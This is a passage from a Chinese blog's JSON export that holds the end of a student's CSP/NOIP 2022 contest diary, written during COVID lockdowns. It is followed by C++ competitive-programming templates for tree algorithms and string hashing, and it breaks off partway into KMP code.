\n最后几分钟检查了一遍文件夹名字，文件读写。最后五分钟发现第二题根据数据范围采用不同的方法写反了，于是改了过来，但没有重新测样例。然后就等待收卷了\n\n出考场后看到了老师，第一句就是“考砸了”。跟老师讲了遇到的情况，感觉题都不难，但是就不会，常见的算法不会打了...\n\n感觉第二题和第四题加起来应该可以稳拿76分。第一题爆搜+卡时不知道能拿多少分，第三题不指望能得分。感觉上个100还有希望？\n\n回去的路上看到车上有个女孩，一脸愁苦，估计也是没考好吧...\n\n回到宾馆，老师把全省的代码发给了我们。在洛谷上自测了一下第二题，竟然只有25分，心态大崩。后面的不敢测了，就出去吃饭了\n\n吃完饭得知，因为疫情原因，cz封城了，需要在酒店里再多住几天。\n\n吃饭回来打算庆祝csp考完，通宵打游戏。本来我是看着别人打王者的，自己不打，那天我借了个有王者荣耀的手机，跟队友在一个房间里五排。一直打到12点，老师敲门，估计是发现我们集体打游戏了，于是让我们回各自的房间睡觉。\n\n回去之后我仍然打了好几局，一直打到6点，人生第一次通宵...虽然不打算睡了，但在床上眯了会眼，还是直接睡着了，睡到了上午10点。\n\n## 2022-10-30\n\n起床之后浑浑噩噩，不知道后面要怎么训练，想再摆烂一天，到第二天再接着训练。上午受到室友的鼓动，把我们这十个人所有人的代码都在洛谷上测了一遍。最高分115，而自己只有70。除去三个爆零的就两个比自己分低的。感觉很难受，一直以来在十个人里面一直都是学的最好的。\n\n下午去测核酸，有人聊天的时候大声把通宵打游戏的事情说了出来，于是测完核酸，老师就决定把手机都给收上去，并且每天10点就要把笔记本收上去，平时在屋里的时候也要把房间门都打开。感觉瞬间不自在了，但也没有办法...\n\n这一天没想到又有模拟赛，刚打完csp就不能歇一歇吗？模拟赛毫无心情，随便写了写，第一题想到了个自认为对的正解，然后写完样例都过不去，又遇到了和csp一样的问题，很无奈...最后得分又排倒数了，然而觉得无所谓了...\n\n晚上去老师房间里，跟老师说不想买后面模拟赛的题了，感觉省一无望，倒不如自己随便做点题，不想被模拟赛操控了。老师跟我谈了一个多小时的心，让我降低压力。\n\n## 2022-10-31~2022-11-5\n\n中间又进行了两次模拟赛。两次都是51nod的题，很水。第一次模拟赛的T1和T3都做过类似的，最后得到了200+pts的好成绩。第二次T1做过类似的，T3写了个瞎搞做法，T4写了个暴力。没想到数据水，直接干到了305pts。信心大增。感觉51nod的题太水，于是就不打算跟着做模拟赛了。后面自己卡时间做了csp2020的题，打出了235pts。当时感觉csp没有之前想象的那么难。\n\n后面就打算着重练习dp，数据结构和图论。\n\n再后来，因为我们住酒店的时间太长了，学校不想继续出钱了，就打算让我们回cz，但因为封城，小区进不去，就只好再住几天\n\n又后来，先是我们做核酸的地方出现了两例阳性，然后换了个地方做核酸，然后是酒店马上要封，于是老师紧急联系车连夜把我们送回cz。\n\n![离开了住了半个月的酒店](https://www.caiwen.work/wp-content/uploads/2022/11/QQ图片20221125010622.jpg)\n\n![高速路口上检查](https://www.caiwen.work/wp-content/uploads/2022/11/QQ图片20221125010608.jpg)\n\n![](https://www.caiwen.work/wp-content/uploads/2022/11/QQ图片20221125010600.jpg)\n\n学校排了三位老师在高速路口上接我们回去，送到了小区门口。最后将近半夜12点回到了家\n\n## 2022-11-5~14\n\n在家里隔离。中间一直在练dp和数据结构还有组合数学。逐渐感觉自己思维活跃起来，很多题可以不看题解做出来了\n\n中间老师突然宣布，因为上次csp，学校的花费超过了预算，所以下次noip的隔离期间的酒店费用就不给报销了。于是开始犹豫，因为家里不是很富裕，这隔离7天的酒店钱就要2k多了。但我妈说：“没事去吧，别给自己留遗憾”。\n\n中间老师突然又宣布，费用学校报销了，但这次noip老师不带队了，想去的需要监护人陪同自行去参加。这下又犯了难。谁家都很难有可以陪同隔离7天的监护人，毕竟都还有着工作。眼看下次出发的时间马上到了，但只有一个家长同意陪同。\n\n最后决定两个老师只去一个，然后学校又派了另一个老师陪同，正常带队去参加比赛。下次noip的考点在衡水\n\n本来还在怕到出发的那天可能没解封，出去不了，结果巧的是，出发前两天突然宣布解封\n\n## 2022-11-15\n\n上午计划了后面隔离的10天怎么过。不能像上次一样没有规律的作息了，要每天坚持刷题，保持思维活跃\n\n中午到校门口集合，到车上，出发去衡水。在车上一会就睡着了，再睁眼就很快到达衡水了\n\n听说衡水比cz还穷，这一去感觉还真是。考点在衡水中学实验学校。刚进桃城区，感觉跟回了老家一样。再往前走，城市逐渐繁华了一些，紧接着车又往田野方向行驶过去。有一段路周围都是田野，但再往前走就发现前面有一堆很现代的建筑物。经过时看到了上面的字“衡水中学实验学校”\n\n![](https://www.caiwen.work/wp-content/uploads/2022/11/IMG_20221115_164228.jpg)\n\n![](https://www.caiwen.work/wp-content/uploads/2022/11/IMG_20221115_164424.jpg)\n\n![](https://www.caiwen.work/wp-content/uploads/2022/11/IMG_20221115_164442.jpg)\n\n虽然衡水挺穷的，但是学校贼大。我们要住的宾馆竟然也是这个学校的\n\n酒店房间360/晚。据说从衡实请假回家返校的都需要在这个酒店隔离七天。一天360...一次返校成本2k...\n\n登记完入住手续之后，服务员没把我们领到酒店里面的房间，而是领到外面，一个类似于小区的公寓楼里面，让我们在那里住下\n\n![](https://www.caiwen.work/wp-content/uploads/2022/11/IMG_20221115_172622.jpg)\n\n这tm就是360/晚的房间？？\n\n教练说酒店人住满了，等17号才会搬过去。我们需要先在教师公寓里住上一天两夜\n\n## 2022-11-16~24\n\n本来说好17号搬到酒店里住，结果16号说房间没腾出来，需要18号再搬过去。17号我们在酒店的会议室里练习，突然让我们离开酒店回到教师公寓。教练说酒店发现了密接，正在确认。18号教练说去不了酒店了，酒店被政府征用来住隔离人员了，我们接下来只能在教师公寓里了\n\n接下来几天就正常练习。自己做了noip2017的题，能擦边省一。noip2020的题，没做下去...。noip2021的题，大概190+pts，省一没问题了，可能有希望冲省队。在洛谷上参加了两场模拟赛，都180+pts。一场40多名，一场30多名，省一没问题了。据说都比noip的难一些。我也找到做题策略：一般第一题都是比较简单的，是肯定需要切掉的。第二题看思维，应该做不出来。后面两题正解肯定想不出来了，直接打暴力。最后一题太难放弃都可以。\n\n两场比赛比较好的成绩，直接洛谷变红名，信心倍增。\n\n重新卡时间做了一下csp2022。T1 $n^4$ 的暴力枚举+预处理一个点能到达的点+贪心+卡时，能搞到85pts。T2 只需要耐心分类讨论各种情况，维护8个st表就可以ac了。T3 只需要判断所有点的出度都是1即可，不用tarjan。加上set，暴力卡时能拿60pts，评测机快的话可以80pts。T4 之前的思路是对的，但是竟然按照求两点路径的方法求两点点权，显然是错误的。应该可以拿16pts。加起来发挥好的话可以有261pts，HE rank11。然而终究是没有发挥好\n\n再次信心倍增，感觉noip2022最次也是省一了，冲个省队也是有希望的，万一T2想出正解了呢\n\n## 2022-11-24\n\n中午吃完饭，躺在床上想着题，突然教练敲门，一脸严肃，“一会你跟我开个会，noip可能举行不了了”\n\n我当时愣了一下，心想问题不大，应该是开个会征求一下意见，应该都不会同意的\n\n随后老师解释，说是石家庄那里情况紧急，没有办法考了。特派员决定取消，最后按csp成绩评奖，而且态度坚决，没有回旋的余地。我当时犹如雷劈，不敢相信\n\n跟着老师听了一下特派员跟各位老师开的会。会议前半段在讲noip绝对举行不了了，后半段在讲省选成绩按什么比例计算，显然已经和我等弱校无关了...\n\n特派员语气很坚决。没有指导老师抗议，也没法抗议...\n\n直到会议结束，也没有奇迹出现...\n\n随后和老师，通知了其他的人。\n\n当时一时间希望自己是在做梦，明明csp没考好等着noip翻盘，结果这等下场...真就省二退役了...\n\n慢慢也接受了这个事实。回去学whk吧，等到大学继续acm吧...\n\n![犹如一场噩梦](https://www.caiwen.work/wp-content/uploads/2022/11/QQ截图20221125015852.png)\n\n","summary":"参加CSP-S2022，由于缺乏实战经验，失手。疫情期间在宾馆隔离。由于疫情原因，NOIP在举办前夕突然宣布取消。","key":["noip","csp","游记","疫情","2022"],"tags":[{"value":"精选","color":"success"}],"path":["记录","高二oier退役记&CSP2022-S2游记.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/11/QQ截图20221125020846.png","recommend":true,"status":"published"},{"type":"Article","title":"树论","id":"noip-tree","createTime":"2022-11-22T14:03:00.000Z","updateTime":"2025-09-05T13:34:05.639Z","content":"\n## 树上序列\n\n### DFS序\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220826170723.png)\n\n从节点1开始的dfs序为：1 2 4 7 8 9 5 3 6\n\nDFS序可以结合树上差分和树状数组可以解决以下问题\n\n1. 单点加：单点修改\n\n2. 子树加：区间修改\n\n3. 路径加：做差分，转换为单点修改\n\n4. 单点求：单点查询，或者做差分后是区间求和\n\n5. 子树求：区间求和\n\n6. 路径求：将点权全部转化为到从根节点到这个点的点权和\n\n### 欧拉序\n\n#### 欧拉序一\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220826171719.png)\n\n从节点1开始的欧拉序一为：1 2 4 7 7 8 8 9 9 4 5 5 2 3 6 6 3 1\n\n如果进一个点是+x，出一个点是-x，则使用前缀和就可以去求出一个点到根节点的距离\n\n#### 欧拉序二\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220826171951.png)\n\n从节点1开始的欧拉序二为：1 2 4 7 4 8 4 9 4 2 5 2 1 3 6 3 1\n\n将欧拉序上的点相应的深度也求出来作为一个新序列，使用st表维护这个序列，就可以求出两点的lca\n\n## 树上差分\n\n### 点差分\n\n点差分解决点权问题\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220826155652-1.png)\n\n对s-t路径上的点的点权都+1，可以$w[s]+1$，$w[t]+1$，$w[lca]-1$，$w[fa[lca]]-1$。在dfs时有如下代码将点权还原\n\n```cpp\nint w[400005],ans;\nvoid sum(int x,int fa){\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(to==fa) continue;\n\t\tsum(to,x);\n\t\tw[x]+=w[to];\n\t}\n}\n```\n\n即可将x为根的子树的节点全部使用前缀和得到实际点权\n\n如果结合dfs序和树状数组，则可以获得更大的效率\n\n### 边差分\n\n边差分和点差分类似。可以将边权转化为较深一点的点权。\n\n如果要在s-t的路径上的边的边权都+1，则需要$w[s]+1$，$w[t]+1$，$w[lca]-2$\n\n## LCA\n\n### 倍增求lca\n\n首先获取log，注意和st表不同，倍增求lca的lg是需要从1开始求的\n\n```cpp\nint n;\nint lg[500001];\nfor(int i=1;i<=n;i++) lg[i]=lg[i>>1]+1;\n```\n\ndfs，获取节点信息\n\n```cpp\nint fa[500001][22];\nint dep[500001];\nvoid dfs(int now,int f){\n\tfa[now][0]=f;\n\tdep[now]=dep[f]+1;\n\tfor(int i=1;i<=lg[dep[now]];i++){\n\t\tfa[now][i]=fa[fa[now][i-1]][i-1];\n\t}\n\tfor(int i=head[now];i;i=edge[i].next){\n\t\tif(edge[i].to!=f) dfs(edge[i].to,now);\n\t}\n}\n```\n\n然后就可以根据节点信息获得lca\n\n```cpp\ninline int lca(int x,int y){\n\tif(dep[x]<dep[y]) swap(x,y);\n\twhile(dep[x]>dep[y]) x=fa[x][lg[dep[x]-dep[y]]-1];//注意这里减1\n\tif(x==y) return x;\n\tfor(int k=lg[dep[x]]-1;k>=0;k--){//这里也是要减1\n\t\tif(fa[x][k]!=fa[y][k]) x=fa[x][k],y=fa[y][k];\n\t}\n\treturn fa[x][0];\n}\n```\n\n### st表求lca\n\nst表求lca，只能在树没有修改的情况下。在预处理后，可以做到$O(1)$的查询\n\n首先dfs，获取欧拉序和深度信息\n\n```cpp\nint dep[500005];\nint fir[500005];//点在欧拉序中第一次出现的位置\nint ver[1000005];//欧拉序\nint r[1000005];//欧拉序位置->点的深度\n\nint tot;\nvoid dfs(int x,int fa){\n\tdep[x]=dep[fa]+1;\n\tfir[x]=++tot;\n\tver[tot]=x;\n\tr[tot]=dep[x];\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(to==fa) continue;\n\t\tdfs(to,x);\n\t\tver[++tot]=x;\n\t\tr[tot]=dep[x];\n\t}\n}\n```\n\n取log（略，参考st表）\n\nst表维护，f为st表维护最小值，rec为取最小值的点\n\n```cpp\nint rec[1000006][20];\nint f[1000006][20];\nfor(int i=1;i<=tot;i++){\n\tf[i][0]=r[i];\n\trec[i][0]=ver[i];\n}\nfor(int i=1;i<=lg[tot];i++){\n\tfor(int j=1;j<=tot-(1<<i)+1;j++){\n\t\tif(f[j][i-1]<f[j+(1<<(i-1))][i-1]){\n\t\t\tf[j][i]=f[j][i-1];\n\t\t\trec[j][i]=rec[j][i-1];\n\t\t}else{\n\t\t\tf[j][i]=f[j+(1<<(i-1))][i-1];\n\t\t\trec[j][i]=rec[j+(1<<(i-1))][i-1];\n\t\t}\n\t}\n}\n```\n\n求lca\n\n```cpp\n//求lca(a,b)\na=fir[a],b=fir[b];\nif(a>b) swap(a,b);\nint k=lg[b-a+1];\nif(f[a][k]<f[b-(1<<k)+1][k]){\n\tcout<<rec[a][k]<<endl;\n}else{\n\tcout<<rec[b-(1<<k)+1][k]<<endl;\n}\n```\n\n### 树链剖分求lca\n\n两次dfs，树链剖分，不需要求tree值和value值\n\n```cpp\nstruct Point{\n\tint dep,fa,size,heavy,top,tree,value;\n} p[500005];\n\nvoid dfs1(int x,int fa){\n\tint mx=-1;\n\tp[x].size=1;\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(to==fa) continue;\n\t\tp[to].dep=p[x].dep+1;\n\t\tp[to].fa=x;\n\t\tdfs1(to,x);\n\t\tp[x].size+=p[to].size;\n\t\tif(p[to].size>mx){\n\t\t\tmx=p[to].size;\n\t\t\tp[x].heavy=to;\n\t\t}\n\t}\n}\n\nvoid dfs2(int x,int fa,int k){\n\tif(x==0) return;\n\tp[x].top=k;\n\tdfs2(p[x].heavy,x,k);\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(to==fa||to==p[x].heavy) continue;\n\t\tdfs2(to,x,to);\n\t}\n}\n```\n\n求lca\n\n```cpp\nint lca(int x,int y){\n\twhile(p[x].top!=p[y].top){\n\t\tif(p[p[x].top].dep>p[p[y].top].dep){\n\t\t\tx=p[p[x].top].fa;\n\t\t}else{\n\t\t\ty=p[p[y].top].fa;\n\t\t}\n\t}\n\treturn p[x].dep<p[y].dep? x:y;\n}\n```\n\n## 树的重心\n\n满足下面性质的点叫树的重心\n\n### 性质\n\n（1）树上每个点为根，都会有若干子树，其中最大子树的大小为这个点的weight。重心的weight最小（重心的定义）\n\n（2）以重心为根，最大子树大小不超过 $\\left \\lfloor \\frac{n}{2} \\right \\rfloor $ （我们利用这个性质求重心）\n\n（3）树上每个点为根，然后这个树种所有节点到根节点的距离之和（树的重心要求树的每条边的距离都为1）叫做和距离。以重心为根的树的和距离是最小的，如果有两个重心，那么这两个重心的和距离相等\n\n（4）两个树通过一条边连接为一个树，那么新树的重心在原来两个树的重心的连线路径上\n\n（5）在树上添加或删除一个点，重心最多只移动一条边的距离\n\n（6）如果有两个重心，那么以这两个重心为为根的子树大小是相等的。可以逆用（使一个树的重心由两个变为一个）\n\n### 求法\n\n利用性质1和性质2，一个dfs即可求出。注意重心最多会有两个\n\n```cpp\nint n;\nint size[20004],w[20004];\nint g[2];\nvoid dfs(int x,int fa){\n\tsize[x]=1;\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(to==fa) continue;\n\t\tdfs(to,x);\n\t\tsize[x]+=size[to];\n\t\tw[x]=max(w[x],size[to]);\n\t}\n\tw[x]=max(w[x],n-size[x]);\n\tif(w[x]<=n/2){\n\t\tg[g[0]!=0]=x;\n\t}\n}\n```\n\n## 树的直径\n\n### 树上dp法\n\n设状态 $dis1[x]$ 表示从x这个点往子树走能走的最大距离；$dis2[x]$ 表示从x这个点往子树走能走的次大距离。转移时，对于x的子节点to，两者距离为w，有：\n\n用 $dis1[to]+w$ 尝试更新 $dis1[x]$ 和 $dis2[x]$\n\n如果 $dis1[to]+w>dis1[x]$ 则 $dis1[x]=dis1[to]+w$\n\n反之，如果 $dis1[to]+w>dis2[x]$ 则 $dis2[x]=dis1[to]+w$\n\n最后，直径即为所有的点中 $dis1[x]+dis2[x]$ 最大的值\n\n```cpp\nint dis1[2000006];\nint dis2[2000006];\nint ans=0;\nvoid dfs(int x,int fa){\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tint w=edge[i].w;\n\t\tif(to==fa) continue;\n\t\tdfs(to,x);\n\t\tif(dis1[to]+w>dis1[x]){\n\t\t\tdis2[x]=dis1[x];\n\t\t\tdis1[x]=dis1[to]+w;\n\t\t}else if(dis1[to]+w>dis2[x]){\n\t\t\tdis2[x]=dis1[to]+w;\n\t\t}\n\t}\n\tans=max(ans,dis1[x]+dis2[x]);\n}\n```\n\n### dfs法\n\n两次dfs。第一次以任意点开始dfs，找到这个距离这个点最短的点x。第二次从点x进行dfs，再找到距离点x最远的点y。xy之间的距离即为直径。相较于树形dp法求直径，dfs法除了求出直径有多长，还能得到直径的端点。\n\n```cpp\nint p,ans,dis[1000006];\nvoid dfs(int x,int fa){\n\tif(ans<dis[x]){\n\t\tans=dis[x];\n\t\tp=x;\n\t}\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tint w=edge[i].w;\n\t\tif(to==fa) continue;\n\t\tdis[to]=dis[x]+w;\n\t\tdfs(to,x);\n\t}\n}\n\nvoid find(int x){\n\tans=0;\n\tdis[x]=0;\n\tdfs(x,0);\n}\n```\n\n## 树的中心\n\n树的中心貌似没有相关题目可以进行评测。仅说一下大致做法\n\n树的中心：树的中心到树中其他节点的最远距离最小\n\n从一个点出发的最长路径有两种情况：从这个点往父节点方向走；从这个点往子树方向走\n\n首先进行一次树形dp，求出每个点往子树方向到达的最长路径 $dis1[]$ 和次长路径 $dis2[]$ 。具体做法和求树的直径部分相同。不同之处在于需要记录 $c1[]$ 和 $c2[]$ 表示 $dis1[]$ 和 $dis2[]$ 是哪个子树转移过来的\n\n再次进行树形dp，求出一个点往父节点方向的最长路径 $u[]$ 。对于一个节点x，其父节点为fa，如果 $c1[fa]!=x$ ，则有 $u[x]=max(dis1[fa],u[fa])+w$。反之，则有 $u[x]=max(dis2[fa],u[fa])+w$\n\n最后，收集答案，即 $ans=min(ans,max(u[x],dis1[x]))$\n\n```cpp\n#include<bits/stdc++.h>\n#define _ 2000006\n#define int long long\nusing namespace std;\n\nstruct Edge{int next,to,w;} edge[_<<1];\nint head[_],size;\ninline void add(int u,int v,int w){edge[++size].next=head[u],edge[size].to=v,edge[size].w=w,head[u]=size;}\n\nint dis1[_],dis2[_],c1[_],c2[_];\nvoid dfs1(int x,int fa){\n    for(int i=head[x];i;i=edge[i].next){\n        int to=edge[i].to;\n        int w=edge[i].w;\n        if(to==fa) continue;\n        dfs1(to,x);\n        if(dis1[to]+w>dis1[x]){\n            dis2[x]=dis1[x],c2[x]=c1[x];\n            dis1[x]=dis1[to]+w,c1[x]=to;\n        }else if(dis1[to]+w>dis2[x]) dis2[x]=dis1[to]+w,c2[x]=to;\n    }\n}\n\nint u[_];\nvoid dfs2(int x,int fa){\n    for(int i=head[x];i;i=edge[i].next){\n        int to=edge[i].to;\n        int w=edge[i].w;\n        if(to==fa) continue;\n        if(c1[x]!=to) u[to]=max(dis1[x],u[x])+w;\n        else u[to]=max(dis2[x],u[x])+w;\n        dfs2(to,x);\n    }\n}\n\nsigned main(){\n    ios::sync_with_stdio(false);\n    int n;cin>>n;\n    for(int i=1,uu,vv,ww;i<n;i++) cin>>uu>>vv>>ww,add(uu,vv,ww),add(vv,uu,ww);\n    dfs1(1,0);dfs2(1,0);\n    int ans=0x3f3f3f3f;\n    for(int i=1;i<=n;i++) ans=min(ans,max(u[i],dis1[i]));\n    cout<<ans;\n    return 0;\n}\n\n```\n\n## 生成树\n\n### 最小生成树\n\nprim算法能做的kruskal似乎都能做。就不写prim算法了\n\n```cpp\nint mst=0;\nvoid kruskal(){\n\tint cnt=0;\n\tfor(int i=1;i<=m;i++){\n\t\tint u=find(e[i].from);\n\t\tint v=find(e[i].to);\n\t\tif(u==v) continue;\n        //注意不是add(u,v,...);\n\t\tadd(e[i].from,e[i].to,e[i].w);\n\t\tadd(e[i].to,e[i].from,e[i].w);\n\t\te[i].flag=true;\n\t\tmst+=e[i].w;\n\t\tfa[u]=v;\n\t\tcnt++;\n\t\tif(cnt==n-1) break;\n\t}\n}\n```\n\n### 次小生成树\n\n#### 非严格次小生成树\n\n先求一个最小生成树，然后枚举非树边，将树上非树边两个端点之间路径经过的最大边权减去，加上非树边边权，可得到一个新的生成树。枚举所有非树边，新生成树中最小的一个就是非严格次小生成树\n\n#### 严格次小生成树\n\n与非严格次小生成树不同的是，如果非树边两个端点之间路径经过的最大边权等于这个非树边的边权，那么这个最大边权是不能选择的，我们需要再找一个次大的。在树链剖分线段树上不仅维护区间最大值，还要维护区间严格次大值\n\n求四个数中的严格次大值，没有就返回0\n\n```cpp\ninline int getse(int a,int b,int c,int d){\n\tint e[5]={a,b,c,d};\n\tsort(e,e+4,[](int a,int b){\n\t\treturn a>b;\n\t});\n\tfor(int i=1;i<3;i++){\n\t\tif(e[i]!=e[0]) return e[i];\n\t}\n\treturn 0;\n}\n```\n\nquery\n\n```cpp\nint query(int x,int y,int d){\n\tint ans=0;\n\twhile(p[x].top!=p[y].top){\n\t\tif(p[p[x].top].dep<p[p[y].top].dep) swap(x,y);\n\t\tpii t=query(1,1,n,p[p[x].top].tree,p[x].tree);\n\t\tx=p[p[x].top].fa;\n\t\tans=max(ans,(t.first==d)? t.second:t.first);\n\t}\n\tif(p[x].dep>p[y].dep) swap(x,y);\n\tpii t=query(1,1,n,p[x].tree+1,p[y].tree);\n\tans=max(ans,(t.first==d)? t.second:t.first);\n\treturn ans;\n}\n```\n\n查询的时候，注意query得到的边权不能为0，且求出的次小生成树要大于最小生成树\n\n```cpp\n    int ans=0x3f3f3f3f3f3f3f3f;\n\tfor(int i=1;i<=m;i++){\n\t\tif(e[i].flag) continue;\n\t\tint tmp=mst-query(e[i].from,e[i].to,e[i].w)+e[i].w;\n\t\tif(tmp<ans&&tmp!=mst+e[i].w&&tmp>mst) ans=tmp;\n\t}\n```\n\n### 瓶颈生成树\n\n树上最大边权最小的树。根据kruskal求解最小生成树的过程可知，最小生成树一定是瓶颈生成树。瓶颈生成树不一定是最小生成树\n\n### Kruskal重构树\n\n#### 性质\n\n（1）若最小生成树有n个节点，那么重构树有且仅有 $2n-1$ 个节点。（用于判断数组开多大）\n\n（2）重构树上两个叶子节点x和y之间路径上的点（不包括x和y）和最小生成树上x到y的路径上的边一一对应\n\n（3）在重构树中，节点的权值随深度增大而增大或减小（具有单调性，可以结合树上倍增）\n\n（4）由性质3和4可知，重构树上x和y的lca的权值等于原图x到y的瓶颈大小\n\n（5）由单调性可知，满足与一个点的瓶颈大小小于某个值的所有的点都在重构树中的同一子树中\n\n#### 求重构树\n\n首先将边排序。将边按递增或递减排序，得到的重构树分别满足大根堆和小根堆的性质\n\n```cpp\nint cnt,p;//p为重构树中的节点数量\nvoid kruskal(){\n\tsort(e+1,e+m+1,[](Edge a,Edge b){\n\t\treturn a.w<b.w;\n\t});\n\tfor(int i=1;i<=n*2;i++) fa[i]=i;\n\tcnt=0,p=n;\n\tfor(int i=1;i<=m;i++){\n\t\tint u=find(e[i].from);\n\t\tint v=find(e[i].to);\n\t\tif(u==v) continue;\n\t\tadd(++p,u);//直接建单向边\n\t\tadd(p,v);\n        //注意，和求最小生成树不同，不是add(..,e[i].to/from)\n\t\tw[p]=e[i].w;\n\t\tfa[u]=p;\n\t\tfa[v]=p;\n\t\tcnt++;\n\t\tif(cnt==n-1) break;\n\t}\n}\n```\n\n然后就得到了一个以p为根的kruskal重构树\n\n## 树链剖分\n\n点信息的结构体\n\n```cpp\nstruct Info{\n\tint dep,size,heavy,fa,value,top,tree;\n} p[30001];\n```\n\n第一次dfs，求出dep,size,heavy,fa\n\n```cpp\nvoid dfs1(int x,int fa){\n\tint mx=-1;\n\tp[x].size=1;\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(to==fa) continue;\n\t\tp[to].dep=p[x].dep+1;\n\t\tp[to].fa=x;\n\t\tdfs1(to,x);\n\t\tp[x].size+=p[to].size;\n\t\tif(p[to].size>mx){\n\t\t\tp[x].heavy=to;\n\t\t\tmx=p[to].size;\n\t\t}\n\t}\n}\n```\n\n第二次dfs，将dfs序和线段树联系起来\n\n```cpp\nint total;\nint num[30001];\nvoid dfs2(int x,int fa,int k){\n\tif(x==0) return;\n\tp[x].top=k;\n\tp[x].tree=++total;\n\tnum[total]=x;\n\tdfs2(p[x].heavy,x,k);\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(to==fa) continue;\n\t\tif(to==p[x].heavy) continue;\n\t\tdfs2(to,x,to);\n\t}\n}\n```\n\nnum表示线段树相应位置的节点编号是多少\n\n然后根据 $num[]$ 建立线段树\n\n### 维护点权\n\n以计算路径上点权之和为例\n\n```cpp\nint query(int x,int y){\n\tint ans=0;\n\twhile(p[x].top!=p[y].top){\n\t\tif(p[p[x].top].dep<p[p[y].top].dep) swap(x,y);\n\t\tans+=query(1,1,n,p[p[x].top].tree,p[x].tree);\n\t\tx=p[p[x].top].fa;\n\t}\n\tif(p[x].dep>p[y].dep) swap(x,y);\n\tans+=query(1,1,n,p[x].tree,p[y].tree);\n\treturn ans;\n}\n```\n\n### 维护边权\n\n需要点权转边权\n\n由于一个点只有一个父节点，所以把边 $(fa,son,w)$ 的边视为节点 $son$ 的点权\n\n其余和维护点权类似。最后在一条链上跳时，注意左端点+1\n\n```cpp\n...\n    if(p[x].dep>p[y].dep) swap(x,y);\n\tans+=query(1,1,n,p[x].tree+1,p[y].tree);\n\treturn ans;\n...\n```\n\n还需要注意，+1后可能x>y，因此在线段树查询的时候需要特判\n\n```cpp\nint query(int k,int l,int r,int x,int y){\n\tif(x>y) return 0;\n...\n```\n\n","summary":"noip提高级范围内的树论相关算法知识点和模板，自用。","key":["noip","模板","树论"],"tags":[{"value":"自用","color":"primary"}],"path":["算法竞赛","板子","noip","树论.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/11/QQ截图20221122220325.png","recommend":false,"status":"published"},{"type":"Article","title":"字符串","id":"noip-string","createTime":"2022-11-21T06:42:00.000Z","updateTime":"2025-09-05T13:34:05.726Z","content":"\n## hash\n\n这里展示使用自然溢出的hash\n\n```cpp\null hashs[_],bases[_],base=131311;\n\nbases[0]=1;\nfor(int i=1;i<=n;i++){\n\tbases[i]=bases[i-1]*base;\n\thashs[i]=hashs[i-1]*base+str[i];\n}\n\ninline ull range(int l,int r){return hashs[r]-hashs[l-1]*bases[r-l+1];}\n```\n\n### 求最小循环节\n\n首先线性筛预处理出素数\n我们有下面两个性质\n\n- 若长度为 $n$ 的前缀是 str 的循环节，则 $k*n$ 也是 str 的循环节 （ $n$ 和 $k*n$ 都是字符串长度的因数）\n\n- 若字符串从 1 到 (len-n) 的子字符串与从 (n+1) 到 len 的子字符串是相同的，且 n 为 len 的因数，则长度为 n 的前缀是该字符串的循环节\n\n于是对于求给定区间的最小循环节，我们可以这样处理\n\n```cpp\n\twhile(q--){\n\t\tint l,r;cin>>l>>r;\n\t\tint len=r-l+1,cnt=0;\n\t\twhile(len>1){//这一步是分解质因数\n\t\t\tnum[++cnt]=nxt[len];\n\t\t\tlen/=nxt[len];\n\t\t}\n\t\tlen=r-l+1;\n\t\tfor(int i=1;i<=cnt;i++){//根据上述第一个性质，我们尝试把一个质因子除掉后还是不是循环节\n\t\t\tint tmp=len/num[i];\n\t\t\tif(range(l,r-tmp)==range(l+tmp,r)) len=tmp;//根据上述第二个性质判断\n\t\t}\n\t\tcout<<len<<endl;;\n\t}\n```\n\n### 求最长公共前缀\n\n**【模板】后缀排序**\n\n读入一个长度为 $ n $ 的由大小写英文字母或数字组成的字符串，请把这个字符串的所有非空后缀按字典序（用 ASCII 数值比较）从小到大排序，然后按顺序输出后缀的第一个字符在原串中的位置。位置编号为 $ 1 $ 到 $ n $。\n\n直接使用sort对每个字符串进行排序的时间复杂度其实是大于 $O(n^2)$ 的，因为两个字符串之间的比较的复杂度是 $O(n)$ 的。为了快速比较两个字符串的字典序，我们考虑求出两个字符串的LCP，然后看LCP下一个字符哪个字符串的大\n\n使用hash+二分来求\n\n```cpp\n#include<bits/stdc++.h>\n#define _ 1000006\n#define ull unsigned long long\nusing namespace std;\n\null base=131311,hashs[_],bases[_];\ninline ull range(int l,int r){return l<=r? hashs[r]-hashs[l-1]*bases[r-l+1]:0;}\nchar str[_];\nint n,a[_];\n\ninline bool cmp(int x,int y){\n\tint l=0,r=min(n-x+1,n-y+1),ans=0;//r处的意思是取两个字符串之间的长度最小的那个字符串的长度\n\twhile(l<=r){\n\t\tint mid=(l+r)>>1;\n\t\tif(range(x,x+mid-1)==range(y,y+mid-1)) ans=mid,l=mid+1;\n\t\telse r=mid-1;\n\t}\n\tif(ans==min(n-x+1,n-y+1)) return x>y;\n\telse return str[x+ans]<str[y+ans];\n}\n\nint main(){\n\tcin>>str+1;\n\tn=strlen(str+1);\n\tbases[0]=1;\n\tfor(int i=1;i<=n;i++){\n\t\tbases[i]=bases[i-1]*base;\n\t\thashs[i]=hashs[i-1]*base+str[i];\n\t\ta[i]=i;\n\t}\n\tsort(a+1,a+n+1,cmp);\n\tfor(int i=1;i<=n;i++) cout<<a[i]<<' ';\n\treturn 0;\n}\n```\n\n## KMP\n\n处理nxt数组\n\n```cpp\nint p=0;\nnxt[1]=0;\nfor(int 